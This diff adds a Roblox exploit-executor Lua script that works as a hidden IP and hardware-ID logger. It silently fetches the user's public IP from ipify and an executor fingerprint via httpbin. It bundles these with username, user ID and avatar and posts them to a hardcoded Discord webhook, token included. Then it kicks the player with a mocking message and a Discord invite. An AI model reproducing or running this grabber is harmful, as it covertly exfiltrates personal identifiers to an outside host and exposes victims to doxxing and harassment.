@@ -1,0 +1,68 @@
+local http_request = http_request;
+if syn then
+    http_request = syn.request
+elseif SENTINEL_V2 then
+    function http_request(tb)
+        return {
+            StatusCode = 200;
+            Body = request(tb.Url, tb.Method, (tb.Body or ''))
+        }
+    end
+end
+
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+local hwid = "";
+
+for i, v in next, hwid_list do
+    if decoded.headers[v] then
+        hwid = decoded.headers[v];
+        break
+    end
+end
+--
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local userId = player.UserId
+local thumbType = Enum.ThumbnailType.AvatarBust
+local thumbSize = Enum.ThumbnailSize.Size420x420
+local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+local playerimage = content
+local IP = game:HttpGet("https://api.ipify.org/", true)
+--
+local aa = "Player Name : ".."****"..game.Players.LocalPlayer.Name.."****"
+local aaa = "\nPlayer User Id : ".."****"..game.Players.LocalPlayer.UserId.."****"
+local aaaa = "\nPlayer IP : ".."****"..IP.."****"
+local aaaaa = "\nPlayer HWID : ".."****"..hwid.."****"
+--
+local OSTime = os.time();
+local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+local Time = os.date('!*t', OSTime);
+local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
+local Content = '****New Log Bellow : ****';
+local Embed = {
+    title = "**" .. "Game Name : " .. GetName.Name .. "**";
+    color = '65280';
+    thumbnail = {
+        url = content
+    };
+    description = aa..aaa..aaaa..aaaaa,
+    footer = { text = game.JobId };
+    author = {
+        name = 'Game Link';
+        url = 'https://www.roblox.com/games/'..Game.PlaceId..'/';
+    };
+    fields = {};
+    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
+};
+(syn and syn.request or http_request) {
+    Url = 'https://discordapp.com/api/webhooks/758513390275526667/puMviOABr3pdKCP-g4Bs6BYdC8mdEnYbbFnMV2AQY9hCPCyrAHr-ZWtrZOMt8osLLdv5';
+    Method = 'POST';
+    Headers = {
+        ['Content-Type'] = 'application/json';
+    };
+    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
+};
+wait(2)
+player:Kick("Yeah bro idk https://discord.gg/TRA36uq")
